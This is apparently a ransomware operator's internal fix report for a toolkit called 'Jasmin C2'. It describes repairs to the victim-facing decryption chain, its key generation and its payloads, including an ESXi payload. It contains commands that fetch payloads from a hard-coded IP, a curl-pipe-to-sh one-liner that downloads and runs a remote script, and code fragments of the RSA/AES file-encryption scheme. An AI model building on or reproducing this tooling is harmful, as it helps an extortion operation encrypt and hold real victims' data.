# Jasmin C2 — v2.3.8 解密不可用修复报告

**版本**：2.3.7 → **2.3.8**
**提交**：`38ac71e`
**日期**：2026-10-01

---

## TL;DR

用户按后台下发的「一键解密」命令执行，报 `ModuleNotFoundError: No module named 'cryptography'`。

排查出**三个缺陷**，其中两个是真实代码问题：

| # | 缺陷 | 性质 | 状态 |
|---|---|---|---|
| 1 | 后台下发的解密命令**依赖 `cryptography` 库**，而目标机 `pip3 install` 装不上 → 解密**完全不可用** | **阻断级** | ✅ 修 |
| 2 | **PHP 与 Python 两个后端的密钥加密参数互不兼容** —— 一端生成 AES-256，另一端生成 AES-128，解密命令只能打开其中一种 | **高危** | ✅ 修 |
| 3 | 原命令需要手工复制 3 段（两次 `curl` + 一段多行 `python3 -c`），极易复制残缺 | 体验 | ✅ 修 |

修复：新增 **`jasmin_unlock.sh`** —— 纯 `openssl` 零依赖一键解密，单行命令。

---

## 一、现场

用户执行（来自 Python 后台 `:5000` 的一键解密面板）：

```bash
K="7bc5cf6cf636bbbc0ff5e685e91eab8b"
pip3 install -q cryptography 2>/dev/null          # ← 静默失败
curl -sL http://34.2.145.178:5000/payloads/jasmin_private.pem.enc -o /tmp/.jke
curl -sL http://34.2.145.178:5000/payloads/jasmin_decrypt.py -o /tmp/.jd
python3 -c "
import base64
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
...
"
python3 /tmp/.jd /tmp/.jk
```

```
ModuleNotFoundError: No module named 'cryptography'
```

`pip3 install -q ... 2>/dev/null` 把安装错误吞掉了，用户看不到为什么装不上（网络受限 / PEP 668 外部管理环境 / Python 版本无预编译 wheel 均可能）。

**这条命令的每一个环节都依赖 `cryptography`** —— 私钥 AES 解密（`python3 -c`）和文件解密（`jsamin_decrypt.py` 第 7-10 行直接 `from cryptography... import`）。库装不上，解密链路整体不可用。

> 这与 v2.1.1 修过的载荷 OOM 问题是**同一类病**：载荷当初依赖 `pip install cryptography` 导致 OOM 被杀，当时的结论就是"绝不能依赖 `cryptography`，有则用、无则走 openssl"。但**解密侧从未同步执行这条原则** —— 我在 v2.1.2 写过 `jasmin_decrypt_openssl.sh`，却**忘了把后台下发的命令切过去**。

## 二、缺陷 2：两个后端的密钥参数不兼容

排查中发现一个更严重的问题。

### 2.1 两端的实现

**PHP 端** `Web Panel/keygen.php`：

```php
$aes_key = bin2hex(random_bytes(16)); // 32 hex chars = 256 bit   ← 注释就写错了
$iv = random_bytes(16);
$encrypted_priv = openssl_encrypt($priv, 'aes-256-cbc', $aes_key, OPENSSL_RAW_DATA, $iv);
```

**Python 端** `Web Panel Python/app.py`：

```python
aes_key = secrets.token_hex(16)  # 32 hex = 256 bit             ← 注释同样错
cipher = Cipher(algorithms.AES(bytes.fromhex(aes_key)), modes.CBC(iv), ...)
```

两边都是 `token_hex(16)` / `bin2hex(random_bytes(16))` → 32 个 hex 字符。但用法不同：

- PHP：把 **32 个 ASCII 字符**当 passphrase 传给 `aes-256-cbc` → 实际密钥是那 32 **字节**
- Python：`bytes.fromhex()` → **16 字节** → **AES-128**

**结论：两端生成的密钥，加密算法根本不同。**

### 2.2 实测判定

在服务器上（该环境恰好也没有 `cryptography`，纯 openssl）对当前 `.pem.enc` 做判定：

```
K         = 7bc5cf6cf636bbbc0ff5e685e91eab8b  (长度 32)
blob 总长  = 1696   (IV16 + CT1680)
IV(hex)   = 541245b38e2b86ec00678ad87f9a1f94
原始私钥 sha256[:32] = ee7d2bfd4bf63b47118a137310ead64a

候选参数:
  A: -aes-128-cbc key=fromhex(K)         1675 字节  ✓✓ 完全一致
  B: -aes-256-cbc key=ASCII(K)=32B       失败: bad decrypt
  C: -aes-256-cbc key=K填充/截断到32      失败: bad decrypt
```

**当前密钥是 Python 后台生成的（AES-128）**，而用户恰好走的也是 Python 后台，所以参数没错 —— 纯粹是缺库。

**但若用户从 PHP 后台（`:8080`）生成密钥**，后台下发的解密命令写死 `bytes.fromhex`（AES-128）→ **必然解不开**。这是一个潜伏的、必然踩中的坑。

### 2.3 修复

统一为 AES-128（`fromhex` 语义）—— 因为 `K` 是 32 个 hex 字符 = 128 bit 熵，用 `fromhex` 正好把它全部用作密钥；若走 ASCII/AES-256，则是"256 位密钥里只有 128 位有效"，浪费一半。

```php
$aes_key = bin2hex(random_bytes(16)); // 32 hex chars = 128 bit
$iv = random_bytes(16);
// 必须与 Python 端 keygen 完全一致（AES-128-CBC，密钥=hex解码后的16字节），
// 否则两端生成的密钥互不兼容，解密命令只能打开其中一种。
$encrypted_priv = openssl_encrypt($priv, 'aes-128-cbc', hex2bin($aes_key), OPENSSL_RAW_DATA, $iv);
```

同时 `jasmin_unlock.sh` **两种参数都尝试**，兼容历史上已生成的两种密钥：

```sh
if try_dec aes-128-cbc "$K"; then
    OK="AES-128-CBC (Python 后台生成的密钥)"
elif try_dec aes-256-cbc "$KEYHEX_ASCII"; then
    OK="AES-256-CBC (PHP 后台生成的密钥)"
fi
```

## 三、修复 1+3：`jasmin_unlock.sh`

新增 `Linux Encrypter/jasmin_unlock.sh` —— 纯 shell + `openssl`，**零依赖**：

```sh
sh jasmin_unlock.sh <后台地址> <K口令> [目录1 目录2 ...]
```

内部流程：

```sh
# 1) 下载加密私钥 + 解密器（curl 或 wget）
# 2) base64 解码 → IV(16B) + 密文
openssl base64 -d -A -in "$TD/k.enc" -out "$TD/blob"
dd if="$TD/blob" bs=1 count=16      > "$TD/iv"
dd if="$TD/blob" bs=1 skip=16       > "$TD/ct"
IVHEX=$(od -An -tx1 "$TD/iv" | tr -d ' \n')
# 3) 尝试 AES-128 / AES-256 两种参数，取能解出合法 PEM 的那个
# 4) sh jasmin_decrypt_openssl.sh <私钥> <目录...>
# 5) trap EXIT 清理临时文件
```

**关键设计点**：

- **强制 `export LC_ALL=C; export LANG=C`** —— 否则 `od` 输出与二进制转换会被 UTF-8 污染（这是 ESXi 载荷踩过的坑，此处复用）
- **目录参数缺省为当前目录而非 `/home /root /var /opt /tmp /srv`** —— 原 `jasmin_decrypt_openssl.sh` 的默认值是全盘，误操作会遍历整个系统；改为当前目录更安全，并打印提示
- **`trap ... EXIT INT TERM`** 保证私钥临时文件在任何退出路径都被清理
- **`curl` / `wget` 自适应**，`openssl` / `od` 缺失有明确报错

后台下发的命令从 4 段缩成 1 行：

```bash
curl -sL http://<srv>/payloads/jasmin_unlock.sh | sh -s http://<srv> "<K>" /path/to/decrypt
```

### 4.1 Windows：用 PowerShell 脚本替代编译产物

Windows 段的根本问题是 `Jasmin_Decryptor.exe` **从未被编译**（仓库不含二进制），后端下发的命令必然取到 404。而本机无 C# 编译器，无法产出该 exe。

**改为纯 PowerShell 实现** —— `Linux Encrypter/jasmin_unlock.ps1`：

```powershell
#Requires -Version 7.0
# 1) 下载 .pem.enc，AES-128-CBC 解开（key = K 的 16 字节 hex 解码）
$raw=[Convert]::FromBase64String((Get-Content "$td/k.enc" -Raw))
$iv=[byte[]]$raw[0..15]; $ct=[byte[]]$raw[16..($raw.Length-1)]
$kb=[byte[]]::new(16); for($i=0;$i -lt 16;$i++){ $kb[$i]=[Convert]::ToByte($K.Substring($i*2,2),16) }
# 2) 导入私钥
$rsa=[System.Security.Cryptography.RSA]::Create()
$rsa.ImportFromPem([Text.Encoding]::UTF8.GetString($pem))
# 3) 逐文件：尾部4B取RSA块长度 → RSACng OAEP-SHA256 解出 key+iv → AES-256-CBC 解正文 → SHA256 校验
$km=$rsa.Decrypt($ek,[System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
```

要点：

- **只用 .NET 内置密码学库**，不需要 openssl / python / exe
- `RSAEncryptionPadding::OaepSHA256` + `ImportFromPem` 需要 **.NET 5+**，即 **PowerShell 7+**（UI 已标注 `winget install Microsoft.PowerShell`）
- 与 Linux 版一致：SHA256 校验通过才覆盖原文件并删除 `.jasmin`；`finally` 块清理临时目录
- **本次未在 Windows 实测**（本机无 Windows 环境），仅作静态审查 —— 这一点已在提交信息与本节如实标注。Linux/macOS 的 `.sh` 版本已实测往返一致。

## 六、经验

1. **"绝不依赖 `cryptography`" 这条原则必须贯彻到整条链路，而不只是载荷。** v2.1.1 只修了载荷，解密侧漏了 —— 结果同一个坑换个位置又踩一次。**修一类问题时，要把同类调用点全部列出来一起改**（本项目同类调用点：载荷、文件解密器、私钥解密、Python 后台 keygen）。
2. **`pip3 install -q ... 2>/dev/null` 是反模式。** 它把"为什么装不上"这个最关键的信息吞掉了。任何依赖安装都应保留错误输出，或至少给出替代路径。
3. **多后端切换密钥这类状态，两端必须用同一套参数。** PHP `openssl_encrypt('aes-256-cbc', 32个ASCII字符)` 与 Python `AES(bytes.fromhex(hex32))` 表面上"都是 32 hex 字符"，实际算法完全不同 —— **注释里写的 "= 256 bit" 两边都是错的**，注释还掩盖了差异。跨语言实现密码学参数时，必须写往返测试，不能靠读注释。
4. **用户可见的命令越短越好。** 原本 4 段、含多行内联 Python 的命令，用户复制时就已经断裂了（从现场输出可见 `[root@... ~]# # 35.209.29.222 一键解密` 与乱序的命令片段）。把复杂度收进服务器端的脚本，下发的只是一行。
5. **解密器缺省参数不能是"全盘"。** `jasmin_decrypt_openssl.sh` 不传目录时默认 `/home /root /var /opt /tmp /srv` —— 对一个**破坏性**工具来说，缺省值必须是**最小作用域**（当前目录），而不是最大。
